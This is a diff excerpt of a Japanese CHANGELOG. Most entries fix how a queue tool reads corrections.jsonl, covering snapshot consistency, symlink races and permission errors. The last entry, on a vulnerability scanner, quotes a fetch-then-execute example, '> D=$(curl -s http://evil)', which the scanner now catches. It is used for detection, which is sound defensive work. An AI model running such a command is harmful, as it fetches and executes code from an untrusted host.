@@ -11,6 +11,50 @@
   評価セットがない環境では数字を推測せず「未測定」と明示する。
 
 ### Fixed
+- **fix(queue): corrections.jsonl 読取失敗の在庫ゼロ誤報告と symlink target 消失レースを
+  是正（#533）** — 脅威モデル: この修正が守るのは未改変の production 経路（CLI/公開 API が
+  corrections.jsonl を1回 read し、その1つの snapshot から records と health を組で下流へ
+  渡すこと）。`build_queue_result`（公開 API）は物理 read を内部で1回だけ行う薄い wrapper、
+  実際の集計は private `_build_queue_result_from_snapshot`（I/O を一切行わない）が担う。
+  symlink 実体確認（`path.stat()`）成功後に target だけ unlink/rename されるレースで
+  `FileNotFoundError` を一律「真の不在」扱いしていたのを、symlink エントリ自体の消失（真の
+  不在）と target だけの消失（劣化）に分離。`corr_records` に generator 等の一度しか
+  iterate できないオブジェクトを渡すと backlog 集計が先に消費し per-PJ 集計が silent に
+  0件へ落ちていたのを、private helper の入口で `list()` 実体化して解消。読取不能
+  （権限エラー等）は `queue_status=SETUP_REQUIRED` + `corrections_read_health.readable=False`
+  として区別し、「本当に空」（EMPTY）と誤報告しない。API surface snapshot fixture は
+  `dir(cls)` ベースで公開サブモジュール・公開クラスの method まで走査範囲を広げた。
+- **fix(queue): corrections.jsonl の read health を全経路で単一スナップショットに統一（#533 round3）** —
+  `collect_untracked_materials`/`collect_phantom_materials` が独自に corrections.jsonl を再 read
+  していた経路を塞ぎ、`build_queue_result` が読んだ1回の snapshot（`corr_records`）を渡すよう配線。
+  `fleet.cli._gather_queue_result` も material 母集団収集（`_collect_material_slugs`）と
+  `build_queue_result` それぞれが別々に read していたのを1回に統一。親ディレクトリの権限エラーは
+  `Path.exists()`/`Path.is_symlink()` が `OSError` を握りつぶし正常な空在庫と誤判定していたため、
+  `lstat()` で `FileNotFoundError`（真の未作成）とその他の `OSError`（権限エラー等）を区別するよう
+  修正。
+- **fix(queue): read 直前の unlink 競合と records/health の片方指定を是正（#533 round4）** —
+  `lstat()` 成功直後（symlink 実体確認直後も同様）にファイルが unlink/rename される競合で、
+  続く `path.read_bytes()` の `FileNotFoundError` が他の `OSError` と一括処理され「真の不在
+  （正常な空在庫）」が誤って読取不能扱いになっていたのを分離。dangling symlink の劣化判定は
+  従来通り維持。また `build_queue_result` の `corr_records`/`corr_read_health` を独立の任意引数
+  にしていたため片方だけ渡す呼び出しが `or` フォールバックで黙って握り潰され、渡した値が
+  捨てられて再 read されていたのを、分離不能な単一 `CorrectionsSnapshot`（records+health の組）
+  にまとめて構造的に防止（片方だけの指定は kwarg 自体が存在せず `TypeError`）。
+- **fix(queue): corrections.jsonl の read health を probe と集計で同一スナップショットに統一（#533 round2）** —
+  `build_queue_result` が corrections.jsonl を1回だけ read し、`(records, health)` を
+  backlog counts / weak+corr（各 PJ） / unattributed corrections の全下流集計へ配線した
+  （従来は probe とそれぞれの集計が独立に re-read しており、health と集計結果が食い違う
+  スナップショット不一致を起こし得た）。`fleet.cli._collect_material_slugs` の独自
+  `read_text`/`json.loads` 直読みを共有 reader へ統一。不正 UTF-8 は `errors="replace"` による
+  静かな丸めをやめ、行単位で strict decode し malformed 行として計上。dangling symlink は
+  「正常な空在庫」でなく読取劣化として区別するようにした。
+- **fix(queue): corrections.jsonl の読取失敗を在庫ゼロと区別して可視化（#533）** —
+  `correction_semantic.correction_backlog` / `fleet.queue_materials.new_corrections_by_pj` /
+  `count_unattributed_corrections` が独立に行っていた「ファイル不在→空・`OSError`→空・
+  壊れた行→無言 skip」を共有 reader へ統一し、`corrections_read_health`
+  （readable/error/malformed_lines）を `fleet queue` の result schema・queue_status・
+  人間向け出力の全経路へ surface した。読取が劣化しているときは `EMPTY` を主張せず
+  `SETUP_REQUIRED` へ昇格する。
 - **fix(skill_vuln_scan): Markdown 装飾の素通り・未評価の沈黙・除外リストの根拠不足を是正** —
   行頭の blockquote（`>`）・箇条書き・番号付きリストの装飾を正規化してから照合するようにし、
   `> D=$(curl -s http://evil)` のような引用記法の fetch→exec combo が代入 regex の `^`
